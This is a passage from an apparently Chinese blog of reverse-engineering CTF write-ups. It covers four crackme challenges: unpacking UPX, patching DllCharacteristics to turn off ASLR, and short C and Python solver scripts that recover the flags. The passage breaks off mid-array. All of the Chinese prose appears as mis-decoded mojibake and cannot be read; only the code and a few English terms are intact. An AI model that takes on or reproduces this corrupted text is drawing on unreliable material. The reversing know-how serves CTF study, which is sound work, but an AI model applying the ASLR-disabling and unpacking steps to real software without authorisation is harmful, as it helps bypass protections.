é‚£å°±idaåŠ¨æ€è°ƒè¯•çœ‹çœ‹è¿™ä¸ªå‡½æ•°æ˜¯åšä»€ä¹ˆã€‚(ä¹Ÿæ˜¯è¿™é‡Œè‡ªå·±æƒ³äº†å¾ˆä¹…çš„é”™è¯¯ï¼Œè™½ç„¶å¾ˆç®€å•çš„ï¼Œå¯èƒ½æ˜¯stlæŠŠè‡ªå·±ææ˜äº†å§)ã€‚</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200510183307210.png" alt="image-20200510183307210"></p><p>å‘ç°é”™è¯¯ï¼Œé‡æ–°è°ƒè¯•åå¾—åˆ°ç»è¿‡ accumulate å‡½æ•°åçš„ç»“æœã€‚ æŠŠç»“æœéƒ½è®°å½•ä¸‹æ¥åã€‚ å‘ç°åªæ˜¯æŠŠ transformå‡½æ•°åçš„ç»“æœè¿›è¡Œäº†é€†åºã€‚<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200510183543551.png" alt="image-20200510183543551"></p><p>å¼€å§‹å†™ exp:  å¾—åˆ° <strong>987 -377 -610 -754 -843 -898 -932 -953 -966 -974 -979 -982 -984 -985 -986 -986</strong>ã€‚ æœ€ååœ¨linuxä¸‹è¿è¡Œç¨‹åºè¾“å…¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdioã€‚h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!a || a == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> fib(a<span class="number">-1</span>) + fib(a<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = fib(i); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">15</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, flag[i] = (i &lt; <span class="number">15</span> ? flag[i] - flag[<span class="number">15</span>]:flag[i]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200510184751024.png" alt="image-20200510184751024"></p><p><strong>æ€»ç»“ï¼šæ³¨æ„ä¼ é€’çš„å‚æ•°æ˜¯æŒ‡é’ˆè¿˜æ˜¯å€¼ã€‚</strong></p><h3 id="Windows-Reverse2"><a href="#Windows-Reverse2" class="headerlink" title="Windows_Reverse2"></a>Windows_Reverse2</h3><p>é¦–å…ˆ,å› ä¸ºæ˜¯ä¸ª.exeæ–‡ä»¶, å…ˆæ‰“å¼€çœ‹ä¸€ä¸‹ç¨‹åºæ˜¯åšä»€ä¹ˆçš„, å‡ºç° <strong>input code:</strong> ä¹Ÿå°±æ˜¯è®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå¯†ç éªŒè¯.</p><p>ç”¨idaæ‰“å¼€, è¿˜æ˜¯å…ˆ shift + 12 æœç´¢ä¸€ä¸‹å­—ç¬¦ä¸², ç„¶è€Œå¹¶æ²¡æœ‰å‘ç°æˆ‘ä»¬æ‰“å¼€ç¨‹åºçœ‹åˆ°çš„ *<em>input code: *</em>,å¹¶ä¸”ç¨‹åºå‡½æ•°ä¹Ÿå¾ˆå°‘, é‚£å°±æ˜¯åŠ å£³äº†çš„. å¼€å§‹ä¹Ÿå¿˜äº†ç”¨è½¯ä»¶æŸ¥ä¸€ä¸‹å£³.</p><p>é‚£ä¹ˆç”¨ODæ‰“å¼€, ä½¿ç”¨å †æ ˆå¹³è¡¡çš„æ–¹æ³•, æ‰¾åˆ°ç¨‹åºçš„ OEP, ç„¶ådump, ä½†æ˜¯æ³¨æ„æ”¹ä¸€ä¸‹åŠ è½½çš„åˆå§‹åœ°å€å’Œå…¥å£ç‚¹,   è¿™ä¸ªç¨‹åºå¹¶ä¸æ˜¯ 0x400000å¼€å§‹, æ¯æ¬¡åŠ è½½éƒ½æ˜¯ä¸ä¸€æ ·çš„åœ°å€,åº”è¯¥æ˜¯ ASLRä¿æŠ¤æŠ€æœ¯å§, ä¹‹å‰æœ‰äº†è§£è¿‡ä¸€äº›.é€šè¿‡å†…å­˜çª—å£, çŸ¥é“äº†æ˜¯ 0x1F0000.&lt;!â€“ </p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200429150859645-1591162094958.png" alt="image-20200429150859645"></p><p>dumpå‡ºå,ä½†æ˜¯æ‰“ä¸å¼€, ä¹‹å‰å­¦ä¹ è„±å£³æ—¶äº†è§£è¿‡,ä½†æ˜¯æ²¡æœ‰å®è·µ. å°±å»ä¸‹è½½<strong>import rec</strong>,ä½†æ‰“å¼€æ‰¾ä¸åˆ°æ¡Œé¢çš„æ–‡ä»¶,  è¯•äº†å¥½å‡ ä¸ªä¹Ÿä¸è¡Œ, ç™¾åº¦ä¹Ÿæ— æœ. ä¹Ÿä¸æƒ³ç”¨è„±å£³è½¯ä»¶,ä¸»è¦æƒ³æ“ä½œä¸€ä¸‹. å…¶å®å¯¹äºå»idaåç¼–è¯‘å·²ç»è¶³å¤Ÿäº†,å› ä¸ºé‚£ä¸ªåªæ˜¯ä¼šå½±å“åŠ¨æ€é“¾æ¥çš„å‡½æ•°.</p><p>idaå†æ¬¡æ‰“å¼€å, æ‰¾åˆ°ä¸»å‡½æ•°, è½¬æ¢ä¸ºä¼ªä»£ç , é€»è¾‘å¾ˆç®€å•, å°±æ˜¯æŠŠæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦å…ˆè¿›è¡Œåˆ¤æ–­,ç„¶åè¿›è¡ŒåŠ å¯†,ä¸ç¼–ç çš„å­—ç¬¦å¯¹æ¯”. å…ˆçœ‹åˆ¤æ–­å‡½æ•°.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200429152407648-1590489723012-1591162107894.png" alt="image-20200429152407648-1590489723012"></p><p>ç„¶åçœ‹å…³é”®çš„åŠ å¯†å‡½æ•°, å‘ç°æœ€ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªå‡½æ•° sub_A71000.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200429155217177-1590489885930-1591162119539.png" alt="image-20200429155217177-1590489885930"></p><p>sub_A7100, åˆšå¼€å§‹çœ‹è¿™ä¸ªå‡½æ•°è§‰å¾—å¾ˆéº»çƒ¦, ä½†æ˜¯ä»ä»¥å‰åšçš„é¢˜æ¥çœ‹, å¹¶ä¸”è¿™ä¸ªå‡½æ•°æœ‰ &gt;&gt; è¿ç®—ç¬¦. å¯ä»¥å¾€baseç¼–ç è€ƒè™‘, é‚£å°±å…ˆçœ‹çœ‹æœ‰æ²¡æœ‰baseç¼–ç çš„æ ‡å¿—.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200429160021209-1590489939494-1591162126116.png" alt="image-20200429160021209-1590489939494"></p><p>åˆ°äº†è¿™é‡Œ , å¯ä»¥çŸ¥é“, ç¨‹åºåªæ˜¯æ ‡å‡†ç æ¢äº†ä¸€ä¸‹. æˆ‘ä»¬å°±ç”¨ç¨‹åºç¼–ç çš„æ•°æ®å’Œ 0x76 å¼‚æˆ–è¿ç®—å¾—åˆ° å¾—åˆ°è¿™é‡Œçš„base64 çš„ç . ç„¶åè¿™ä¸ªç å»è§£ç åé¢ç”¨æ¥åšæ¯”è¾ƒçš„å­—ç¬¦,å¾—åˆ°ç¬¬ä¸€æ¬¡è½¬æ¢åçš„ç»“æœ. ä½†æ˜¯å¼‚æˆ–è¿ç®—å, æˆ‘ä»¬å‘ç°è¿™ä¸ªç å°±æ˜¯base64æ ‡å‡†ç .</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200429162141561-1590490034442-1591162136025.png" alt="image-20200429162141561-1590490034442"></p><p>æœ€å, çŸ¥é“å¼€å§‹æ˜¯æŠŠæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦è¿›è¡Œæ•°å€¼è½¬æ¢çš„, é‚£ä¹ˆæœ€åè§£ç åæˆ‘ä»¬ä¹Ÿè¦è¿˜åŸä¸€ä¸‹. æ‡’å¾—Cè¯­è¨€è‡ªå·±å†™äº†, ç”¨ python çš„ hex(). æœ€å flagå°±æ˜¯  <strong>ADEBDEAEC7BE</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s =  base64.b64decode(<span class="string">'reverse+'</span>)</span><br><span class="line"><span class="keyword">print</span> (type(s)) / åˆšå­¦python,æŸ¥çœ‹ä¸€ä¸‹æ˜¯ä»€ä¹ˆç±»å‹,å› ä¸ºç”¨hex(), å‘ç° list, tupleéƒ½æ²¡æœ‰ hex().</span><br><span class="line"><span class="keyword">print</span> (s.hex().upper())</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200501113755270-1590490003811-1591162636827.png" alt="image-20200501113755270-1590490003811"></p><p><strong>æ€»ç»“: 1.é¢˜ç›®æœ‰æ—¶å€™çœ‹èµ·æ¥ä»£ç å¾ˆå†—é•¿, ä½†é€»è¾‘ä¸éš¾çš„, ç»†å¿ƒåˆ†æä¸€ä¸‹.  è¦æ³¨æ„baseå®¶æ—çš„ç¼–ç ä¸è§£ç .   2.æ­£åœ¨å­¦ä¹ pythonä¸­, æ¯æ¬¡å†™pythonè„šæœ¬éƒ½æœ‰æ”¶è·.</strong></p><table><thead><tr><th>å­—ç¬¦ä¸²å‰æ·»åŠ r , è¡¨ç¤ºåç»­çš„å­—ç¬¦ä¸²åŸæ ·è¾“å‡º, ä¸è¿›è¡Œè½¬ä¹‰. å¦‚ \\ è½¬ä¹‰åä¸º \</th></tr></thead><tbody><tr><td><strong>å­—ç¬¦ä¸²å‰æ·»åŠ b, åé¢å­—ç¬¦ä¸²æ˜¯bytes ç±»å‹</strong></td></tr><tr><td><strong>åœ¨ Python3 ä¸­ï¼Œbytes å’Œ str çš„äº’ç›¸è½¬æ¢æ–¹å¼æ˜¯:str.encode(â€˜utf-8â€™)   bytes.decode(â€˜utf-8â€™)</strong></td></tr></tbody></table><h3 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows_Reverse1"></a>Windows_Reverse1</h3><p>é¦–å…ˆè¿™é“é¢˜ä¸ä¸Šé¢çš„ä¸€é“æ˜¯ä¸€èµ·çš„, åšäº†ä¸Šé¢çš„ä¸€é“é¢˜, è§‰å¾—åº”è¯¥è¿˜æ˜¯æœ‰å£³çš„, æŸ¥ä¸€ä¸‹æ˜¯ upx.</p><p>è½½å…¥ODè¿˜æ˜¯ä½¿ç”¨å †æ ˆå¹³è¡¡çš„åŸç†è„±å£³, å‘ç°åŒæ ·æ˜¯æ¯æ¬¡è½½å…¥çš„åœ°å€ä¸ä¸€æ ·, è„±å£³åè¿˜æ˜¯ä¸èƒ½è¿è¡Œ, è¿˜æ˜¯è¦ä¿®å¤è¾“å…¥è¡¨, ä½†import recåˆæ‰¾ä¸åˆ°æˆ‘ç”µè„‘çš„æ–‡ä»¶â€¦â€¦.å°±å…ˆæŠŠé¢˜åšäº†å†æ¥ç ”ç©¶.</p><p>idaè½½å…¥åååˆ†ç®€æ´. ä¸€ä¸ªåŠ å¯†å‡½æ•°åè¿›è¡Œåˆ¤æ–­. çœ‹åŠ å¯†å‡½æ•°.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200430190548596-1590490212309-1591162149285.png" alt="image-20200430190548596-1590490212309"></p><p>å› ä¸ºä¸Šé¢çš„ Reverse1 ä¹Ÿæ˜¯åˆåŒæ ·çš„é—®é¢˜(<strong>ä¸åŒçš„å˜é‡å¦‚ä½•è”ç³»åœ¨ä¸€èµ·çš„</strong>), å˜é‡åœ°å€æ˜¯ç›¸åŒçš„. å°±å…ˆçœ‹çœ‹ä¸Šé¢ <strong>v1çš„åœ°å€, å‘ç°æ˜¯ ecx ä¼ æ¥çš„</strong>, é‚£å†çœ‹çœ‹ä¸Šä¸€å±‚å‡½æ•°çš„ ecx . å‘ç°åœ¨è°ƒç”¨è¿™ä¸ªåŠ å¯†å‡½æ•°ä¹‹å‰æœ‰ä¸€ä¸ªecxèµ‹å€¼. <strong>è€Œè¦ç”¨æ¥æœ€åæ¯”è¾ƒçš„ v4å˜é‡, å®ƒçš„åœ°å€å’Œä¼ ç»™ecxæ˜¯ä¸€æ ·çš„</strong>.  <strong><em>é‚£è¿™é‡Œå°±æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„å‚æ•°.</em></strong></p><p>ä¸Šé¢çš„ä»£ç è§‰å¾—å¥‡æ€ª, æ€€ç–‘æ˜¯idaçš„åŸå› , æŠŠåŸç¨‹åºåˆ° OD åŠ¨æ€è°ƒè¯•çœ‹ä¸€ä¸‹åŠ å¯†å‡½æ•°.  æ¸…æ™°å¾ˆå¤š.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200430192452991-1590490227510-1591162179011.png" alt="image-20200430192452991-1590490227510"></p><p>æ‰€ä»¥è¿™ä¸ªå‡½æ•°å°±æ˜¯é€šè¿‡æˆ‘ä»¬è¾“å…¥çš„ASCIIä¸ºç´¢å¼•å€¼æ¥ä¾æ¬¡å–å‡ºç¼–ç å­—ç¬¦çš„æ•°æ®, æœ€å<strong>DDCTF{reverseME}</strong>è¿›è¡Œæ¯”è¾ƒ.</p><p>å¯ä»¥çœ‹åˆ°æ˜¯ä» 0x402FF8 ä¸ºé¦–åœ°å€å¼€å§‹ç´¢å¼•, ä½†æ˜¯ä»idaä¸­å¯ä»¥çŸ¥é“ å¯æ‰“å°å­—ç¬¦æ˜¯ä»0x403018å¼€å§‹çš„.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200430200350749-1590490244163-1591162185500.png" alt="image-20200430200350749-1590490244163"></p><p>æœ€å,æˆ‘é‡åˆ°çš„å¾ˆå¤§çš„å‘â€¦..ğŸ¤£, å­—ç¬¦ä¸²å¤åˆ¶ä¸‹æ¥å, æˆ‘æ²¡æœ‰å¤„ç†å…¶ä¸­çš„  \  çš„å­—ç¬¦, é‚£ä¹ˆå°±è¢«é»˜è®¤ä¸ºè½¬ä¹‰å­—ç¬¦äº†, å¯¼è‡´2ä¸ªå­—ç¬¦å˜æˆä¸€ä¸ª, æœ€åç»“æœè‚¯å®šé”™.  èŠ±äº†å¥½å¤šæ—¶é—´æ‰¾è¿™ä¸ªé”™è¯¯, è¿˜æ˜¯æ²¡æœ‰åœ¨ç»†èŠ‚ä¸Šæ³¨æ„ğŸ˜¢.   <strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(',27h,'&amp;%$#\"! "</span>; </span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">"DDCTF&#123;reverseME&#125;"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(b); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(a); j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] == b[i])</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = j + <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åšå®Œå,å¼€å§‹å»äº†è§£ <strong>ASLR</strong>, çŸ¥é“äº†å¼€å¯ASLRçš„PEæ–‡ä»¶ä¼šå¤šäº†ä¸€ä¸ª.relocèŠ‚åŒº, ä¸”IMAGE_OPTIONAL_HEADER32ç»“æ„ä¸­çš„DllCharacteristicså¤šäº†ä¸€ä¸ªå±æ€§. å¦‚æœä¸€ä¸ªç¨‹åºå¼€å¯äº†ASLRä¿æŠ¤, æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªDllCharacteristicsçš„å€¼ä»<strong>8140</strong>æ”¹ä¸º<strong>8100</strong>ä»è€Œå…³é—­ASLR.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200430204438115-1590490290134-1591162198441.png" alt="image-20200430204438115-1590490290134"></p><p><strong>æ€»ç»“: (1)ä¸€ä¸ªç¨‹åºä¸­çš„å‚æ•°å¯èƒ½ä¼šä»¥å¯„å­˜å™¨çš„æ¥ä¼ é€’ (2)å­—ç¬¦ä¸²ä¸­æ³¨æ„ \ å­—ç¬¦, è¦ç”¨ \\æ¥è¡¨ç¤º \ å­—ç¬¦. (3)ç¨‹åºçš„ASLRçš„å¼€å¯æ ‡å¿—åŠå…³é—­æ–¹æ³•.</strong> </p><h3 id="gametime"><a href="#gametime" class="headerlink" title="gametime"></a>gametime</h3><p>é¦–å…ˆæŸ¥å£³, å‘ç°æ— å£³. æ‰“å¼€ç¨‹åºçœ‹ä¸€ä¸‹.   æœç„¶æ˜¯ä¸€ä¸ªæ¸¸æˆ, ç®€å•çš„çœ‹äº†ä¸€ä¸‹, æ˜¯è®©æˆ‘ä»¬åœ¨è§„å®šæ—¶é—´è¾“å…¥å±å¹•ä¸Šæ˜¾ç¤ºçš„å­—ç¬¦. </p><p>idaæ‰“å¼€, çœ‹ä¼ªä»£ç , å¾ˆå†—é•¿,  å‘ä¸‹æµè§ˆä¸€ä¸‹å¯ä»¥çœ‹è§å¥½å‡ ä¸ªåˆ¤æ–­å‡½æ•°. ä¸”éƒ½æ˜¯ä¸€ä¸ªå‡½æ•°, ç¨‹åºè‚¯å®šä¸åº”è¯¥æ˜¯é€€å‡º. æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯è®©å®ƒçš„è¿”å›å€¼ä¸º <strong>é0</strong></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200501104557726-1590490317124-1591162209414.png" alt="image-20200501104557726-1590490317124"></p><p>è¿›å…¥ sub_401507 çœ‹çœ‹. å‘ç°è¿˜æœ‰ä¸ªåˆ¤æ–­çš„åœ°æ–¹, <strong>æˆ‘ä»¬çš„ç›®çš„: è®©å®ƒè¿”å›1</strong> è®°å½•ä¸‹åœ°å€. <strong>0x00401563</strong>. <img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200501105251204-1590490324745-1591162219087.png" alt="image-20200501105251204-1590490324745"></p><p>æ­¤æ—¶ç¨‹åºä¸‹é¢è¿˜æœ‰ç±»ä¼¼çš„åˆ¤æ–­å‡½æ•°, é‚£ä¹ˆç›¸åŒçš„æ–¹æ³•, å…ˆæ‰¾åˆ°åœ°å€, è®°å½•ä¸‹æ¥.</p><p>æœ€åå‘ç°, ç¨‹åºçš„æ ¸å¿ƒåˆ¤æ–­å‡½æ•°å°±åªæœ‰2ä¸ª.  åœ°å€åˆ†åˆ«ä¸º:  <strong>0x00401563</strong> ,  <strong>0x004014DB</strong> </p><p>æŠŠç¨‹åºè½½å…¥OD. è·³åˆ°æˆ‘ä»¬æ‰¾åˆ°çš„åœ°å€, å‘ç°åœ°å€å¯¹ä¸ä¸Š, é‚£ç¨‹åºæ˜¯å¼€å¯äº† ASLR çš„, ä½†æ˜¯ RVA æ˜¯ä¸€æ ·çš„, ç®€å•çš„ç®—ä¸€ä¸‹å°±å¯ä»¥äº†.   å¦å¤–ä¸€ä¸ªåœ°å€, ç›¸åŒçš„æ“ä½œ.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200501110440340-1590490372567-1591162227662.png" alt="image-20200501110440340-1590490372567"></p><p>æœ€åF9è¿è¡Œ, æ¸¸æˆè¿›è¡Œä¸€æ®µæ—¶é—´, å‡ºç°flag. <img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200501110942866-1591162259944.png" alt="image-20200501110942866"></p><p><strong>æ€»ç»“: ç®€å•çš„åŠ¨æ€è°ƒè¯•çš„åº”ç”¨, æ³¨æ„åœ°å€æ˜¯ä¸æ˜¯ image base.</strong></p><h3 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h3><p>é¦–å…ˆæŸ¥å£³, å‘ç°æ˜¯ upx. è½½å…¥OD, å‡†å¤‡è„±å£³, ä½†æ˜¯å‘ç° <strong>VA</strong> ä¸æ˜¯é»˜è®¤åŠ è½½çš„0x400000, åº”è¯¥æ˜¯å¼€å¯äº† ASLR.  è½¬åˆ°010editor,æ‰¾åˆ° <strong>struct DLL_CHARACTERISTICS DllCharacteristics</strong>, å°†8140æ”¹ä¸º8100.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200502082437777-1590490407479-1591162332414.png" alt="image-20200502082437777-1590490407479"></p><p>æ¥ä¸‹æ¥, é‡æ–°è½½å…¥OD,ä½¿ç”¨å †æ ˆå¹³è¡¡æ‰¾åˆ°ç¨‹åº EOP, ç„¶å dump.</p><p>è„±å£³åè½½å…¥IDA, ç¨‹åºé€»è¾‘ç®€å•, é¦–å…ˆé™åˆ¶é•¿åº¦ &lt;= 37, ç„¶åä¸€ä¸ªåˆ¤æ–­å‡½æ•°, æˆ‘ä»¬è¿›å…¥: ç®—æ³•ä¹Ÿä¸éš¾.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200502083116266-1590490428595-1591162345446.png" alt="image-20200502083116266-1590490428595"></p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = &#123;</span><br><span class="line">   <span class="number">50</span>,  <span class="number">97</span>,  <span class="number">52</span>,  <span class="number">57</span>, <span class="number">102</span>,  <span class="number">54</span>,  <span class="number">57</span>,  <span class="number">99</span>,  <span class="number">51</span>,  <span class="number">56</span>, </span><br><span class="line">   <span class="number">51</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">100</span>, <span class="number">101</span>,  <span class="number">57</span>,  <span class="number">54</span>, <span class="number">100</span>,  <span class="number">54</span>, <span class="number">102</span>,  <span class="number">52</span>, <span class="number">101</span>,  <span class="number">48</span>, </span><br><span class="line">   <span class="number">50</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">56</span>,  <span class="number">52</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>, <span class="number">100</span>,  <span class="number">54</span>, </span><br><span class="line">   <span class="number">49</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">52</span>,  <span class="number">56</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">101</span>,  <span class="number">50</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">54</span>,  <span class="number">55</span>,  <span class="number">55</span>,  <span class="number">56</span>,  <span class="number">54</span>, </span><br><span class="line">  <span class="number">101</span>,  <span class="number">50</span>,  <span class="number">49</span>, <span class="number">100</span>,  <span class="number">53</span>,  <span class="number">97</span>, <span class="number">100</span>,  <span class="number">97</span>, <span class="number">101</span>,  <span class="number">54</span>, </span><br><span class="line">    <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> b[] = &#123;</span><br><span class="line">   <span class="number">97</span>,  <span class="number">52</span>,  <span class="number">57</span>, <span class="number">102</span>,  <span class="number">54</span>,  <span class="number">57</span>,  <span class="number">99</span>,  <span class="number">51</span>,  <span class="number">56</span>, </span><br><span class="line">   <span class="number">51</span>,  <span class="number">57</span>,  <span class="number">53</span>,  <span 